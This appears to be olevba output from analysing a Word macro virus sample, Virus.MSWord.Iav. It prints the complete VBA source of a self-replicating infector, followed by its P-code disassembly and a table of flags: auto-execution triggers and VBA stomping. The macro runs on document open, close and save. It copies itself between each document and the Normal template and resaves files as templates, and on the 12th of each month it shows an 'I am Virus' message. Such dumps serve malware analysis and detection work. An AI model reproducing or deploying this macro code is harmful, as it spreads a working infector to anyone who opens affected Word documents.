olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Iav
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Iav - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO I_am_Virus.bas 
in file: Virus.MSWord.Iav - OLE stream: 'Macros/VBA/I_am_Virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.FileSave"
fnm = ActiveDocument.FullName
nm = ActiveDocument.Name
dot = NormalTemplate.FullName
cdr = CurDir()
cnm = Len(nm)
pix = Mid(nm, cnm - 3, 1)

Body

On Error Resume Next
 Application.OrganizerCopy Source:=dot, Destination:= _
        fnm, Name:="I_am_Virus", Object:=wdOrganizerObjectProjectItems

On Error Resume Next
Application.OrganizerCopy Source:=fnm, Destination:= _
       dot, Name:="I_am_Virus", Object:=wdOrganizerObjectProjectItems

10:
If pix = "." Then GoTo 11
fnm = cdr + "\" + nm + ".doc"
11:
    ActiveDocument.SaveAs FileName:=fnm, _
        FileFormat:=wdFormatTemplate
        
    End Sub
Sub Body()
dat_ = Date
day_of_month = Day(dat_)
If day_of_month <> "12" Then GoTo 99
MsgBox "      I am Virus", , "        Hello"
99:
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ ñîçäàí 14.04.01 Programmer"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
FileSave
End Sub
Sub AutoClose()
FileSave
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Iav
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/I_am_Virus - 2666 bytes
' Line #0:
' 	FuncDefn (Sub FileSave())
' Line #1:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St fnm 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St nm 
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St dot 
' Line #4:
' 	ArgsLd CurDir 0x0000 
' 	St cdr 
' Line #5:
' 	Ld nm 
' 	FnLen 
' 	St cnm 
' Line #6:
' 	Ld nm 
' 	Ld cnm 
' 	LitDI2 0x0003 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St pix 
' Line #7:
' Line #8:
' 	ArgsCall Body 0x0000 
' Line #9:
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LineCont 0x0004 09 00 08 00
' 	Ld dot 
' 	ParamNamed Source 
' 	Ld fnm 
' 	ParamNamed Destination 
' 	LitStr 0x000A "I_am_Virus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #12:
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LineCont 0x0004 09 00 07 00
' 	Ld fnm 
' 	ParamNamed Source 
' 	Ld dot 
' 	ParamNamed Destination 
' 	LitStr 0x000A "I_am_Virus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #15:
' Line #16:
' 	LineNum 10 
' 	BoS 0x0000 
' Line #17:
' 	Ld pix 
' 	LitStr 0x0001 "."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 11 
' 	EndIf 
' Line #18:
' 	Ld cdr 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld nm 
' 	Add 
' 	LitStr 0x0004 ".doc"
' 	Add 
' 	St fnm 
' Line #19:
' 	LineNum 11 
' 	BoS 0x0000 
' Line #20:
' 	LineCont 0x0004 07 00 08 00
' 	Ld fnm 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #21:
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub Body())
' Line #24:
' 	Ld Date 
' 	St dat_ 
' Line #25:
' 	Ld dat_ 
' 	ArgsLd Day 0x0001 
' 	St day_of_month 
' Line #26:
' 	Ld day_of_month 
' 	LitStr 0x0002 "12"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo 99 
' 	EndIf 
' Line #27:
' 	LitStr 0x0010 "      I am Virus"
' 	ParamOmitted 
' 	LitStr 0x000D "        Hello"
' 	ArgsCall MsgBox 0x0003 
' Line #28:
' 	LineNum 99 
' 	BoS 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub AutoOpen())
' Line #31:
' 	ArgsCall FileSave 0x0000 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub AutoClose())
' Line #34:
' 	ArgsCall FileSave 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

